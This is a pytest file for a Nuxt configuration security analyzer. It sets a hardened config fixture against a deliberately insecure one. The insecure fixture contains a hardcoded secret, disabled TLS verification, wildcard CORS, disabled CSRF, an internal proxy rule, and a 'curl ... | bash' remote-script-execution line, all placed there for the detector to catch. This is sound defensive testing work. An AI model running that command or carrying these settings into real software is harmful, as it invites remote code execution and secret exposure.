"""Tests for NuxtAnalyzer."""

from pathlib import Path

from devai.nuxt_analyzer import NuxtAnalyzer, NuxtFinding

HARDENED_CONFIG = """\
export default defineNuxtConfig({
  ssr: true,
  devtools: { enabled: process.env.NODE_ENV !== 'production' },
  sourcemap: { server: false, client: false },
  runtimeConfig: {
    apiSecret: process.env.NUXT_API_SECRET,
    public: {
      apiBase: process.env.NUXT_PUBLIC_API_BASE,
    },
  },
  telemetry: false,
})
"""

INSECURE_CONFIG = """\
export default defineNuxtConfig({
  ssr: false,
  devtools: { enabled: true },
  sourcemap: true,
  runtimeConfig: {
  public: {
    apiKey: 'supersecret123',
  },
  },
  nitro: {
    routeRules: {
      '/proxy': { proxy: 'http://127.0.0.1:8080/**' },
    },
  },
  vite: {
    server: {
      allowedHosts: true,
    },
  },
  cors: '*',
  csrf: false,
  telemetry: true,
  experimental: { wasm: true },
  api_key=supersecret123
  AKIAIOSFODNN7EXAMPLE
  NODE_TLS_REJECT_UNAUTHORIZED=0
  curl http://example.com/install.sh | bash
})
"""


class TestNuxtAnalyzer:
    def test_detects_insecure_patterns(self, tmp_path: Path):
        (tmp_path / "nuxt.config.ts").write_text(INSECURE_CONFIG, encoding="utf-8")
        analyzer = NuxtAnalyzer(str(tmp_path))
        kinds = {f.kind for f in analyzer.analyze()}
        assert "ssr_disabled" in kinds
        assert "devtools_enabled" in kinds
        assert "sourcemap_enabled" in kinds
        assert "nitro_proxy_internal" in kinds
        assert "allowed_hosts_wildcard" in kinds
        assert "cors_wildcard" in kinds
        assert "csrf_disabled" in kinds
        assert "hardcoded_secret" in kinds
        assert "tls_verification_disabled" in kinds
        assert "curl_pipe_shell" in kinds
        assert "telemetry_enabled" in kinds
        assert analyzer.stats.config_files == 1

    def test_hardened_config_has_no_high_findings(self, tmp_path: Path):
        (tmp_path / "nuxt.config.ts").write_text(HARDENED_CONFIG, encoding="utf-8")
        analyzer = NuxtAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        high = [f for f in findings if f.severity == "high"]
        assert high == []
        assert analyzer.health_score() == 100.0

    def test_no_config_returns_full_score(self, tmp_path: Path):
        analyzer = NuxtAnalyzer(str(tmp_path))
        assert analyzer.stats.config_files == 0
        assert analyzer.health_score() == 100.0
        assert "none found" in analyzer.summary()

    def test_finding_format(self):
        finding = NuxtFinding(
            kind="devtools_enabled",
            severity="medium",
            message="test message",
            path="nuxt.config.ts",
            lineno=3,
        )
        assert "nuxt.config.ts:3" in finding.format()

    def test_to_context(self, tmp_path: Path):
        (tmp_path / "nuxt.config.ts").write_text(HARDENED_CONFIG, encoding="utf-8")
        context = NuxtAnalyzer(str(tmp_path)).to_context()
        assert "Nuxt config analysis" in context
        assert "health score" in context

    def test_nuxt_config_js(self, tmp_path: Path):
        (tmp_path / "nuxt.config.js").write_text(HARDENED_CONFIG, encoding="utf-8")
        analyzer = NuxtAnalyzer(str(tmp_path))
        assert len(analyzer.config_files()) == 1

    def test_generate_hardened_template(self):
        template = NuxtAnalyzer(".").generate_hardened_template()
        assert "defineNuxtConfig" in template
        assert "telemetry: false" in template
